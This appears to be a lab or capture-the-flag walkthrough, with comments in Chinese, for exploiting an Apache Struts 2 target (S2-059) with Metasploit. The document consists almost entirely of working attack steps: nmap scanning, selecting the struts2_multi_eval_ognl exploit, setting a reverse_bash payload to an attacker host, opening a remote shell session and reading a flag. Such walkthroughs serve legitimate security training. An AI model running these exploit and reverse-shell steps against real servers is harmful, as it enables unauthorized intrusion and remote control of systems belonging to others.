# metasploit 基础配置
# 更新 metasploit
sudo apt install -y metasploit-framework

# 初始化 metasploit 本地工作数据库
sudo msfdb init

# 启动 msfconsole
msfconsole

# 确认已连接 pgsql
db_status

# 建立工作区
workspace -a demo

# 信息收集之服务识别与版本发现
# 通过 vulfocus 场景页面看到入口靶标的开放端口
db_nmap -p 12862 192.168.56.175 -n -A

# search exp in metasploit
search struts2 type:exploit
# Matching Modules
# ================
# 
#    #  Name                                             Disclosure Date  Rank       Check  Description
#    -  ----                                             ---------------  ----       -----  -----------
# ...
#    2  exploit/multi/http/struts2_namespace_ognl        2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
# ...
#    7  exploit/multi/http/struts_code_exec_parameters   2011-10-01       excellent  Yes    Apache Struts ParametersInterceptor Remote Code Execution

# 查看 exp 详情
# 可以直接通过搜索结果编号，也可以通过搜索结果的 Name 字段
info 2

# 继续完善搜索关键词
search S2-059 type:exploit

# Matching Modules
# ================
# 
#    #  Name                                        Disclosure Date  Rank       Check  Description
#    -  ----                                        ---------------  ----       -----  -----------
#    0  exploit/multi/http/struts2_multi_eval_ognl  2020-09-14       excellent  Yes    Apache Struts 2 Forced Multi OGNL Evaluation
# 

# 使用上述 exp
use 0

# 查看 exp 可配置参数列表
show options

# 查看可用 exp payloads
show payloads

# 使用合适的 exp payload
set payload payload/cmd/unix/reverse_bash

# 配置 exp 参数
# 确保所有 Required=yes 参数均正确配置

# 靶机 IP
set RHOSTS 192.168.56.175 
# 靶机目标端口
set rport  12862          
# 攻击者主机 IP
set LHOST  192.168.56.214 

# 再次检查 exp 配置参数列表
show options

# getshell
run -j

# 如果攻击成功，查看打开的 reverse shell
sessions -l

# Active sessions
# ===============
# 
#   Id  Name  Type            Information  Connection
#   --  ----  ----            -----------  ----------
#   1         shell cmd/unix               192.168.56.214:4444 -> 192.168.56.175:60690  (192.168.56.175)

# 进入会话 1
sessions -i 1
# 无命令行交互提示信息，试一试 Bash 指令
id

# get flag-1
ls /tmp
# flag-{bmh59f8b130-69ea-495d-86a9-dbf789e18b3f}

# 通过 CTRL-Z 将当前会话放到后台继续执行